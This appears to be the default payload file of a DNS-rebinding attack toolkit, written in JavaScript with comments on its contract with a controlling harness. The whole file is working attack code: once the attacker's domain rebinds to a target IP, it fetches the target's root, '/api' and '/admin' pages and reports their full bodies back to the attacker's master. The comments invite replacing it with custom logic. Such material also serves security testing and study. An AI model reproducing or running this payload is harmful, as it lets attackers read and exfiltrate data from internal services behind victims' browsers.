// rebind payload — runs inside each iframe AFTER the origin has rebound to the
// target IP, so all same-origin requests here hit the target.
//
// Contract: define `async function runPayload(rebind)`. The harness calls it
// once, when the master signals "execute". The `rebind` helper provides:
//   rebind.host          — the current origin hostname (the attacker domain)
//   rebind.report(data)  — send a result (any JSON-serializable value) to master
//   rebind.error(err)    — report an error to master
// Returning a rejected promise / throwing is also reported as an error.
//
// This default reads the target's root and a couple of common paths, reporting
// status + the full body of each. Replace the body with your own logic.

async function runPayload(rebind) {
  const paths = ["/", "/api", "/admin"];
  const findings = [];

  for (const path of paths) {
    try {
      const res = await fetch(path, { cache: "no-store" });
      const body = await res.text();
      findings.push({
        path,
        status: res.status,
        length: body.length,
        body, // full response body — the master renders it untruncated
      });
    } catch (e) {
      findings.push({ path, error: String(e) });
    }
  }

  rebind.report({ host: rebind.host, findings });
}
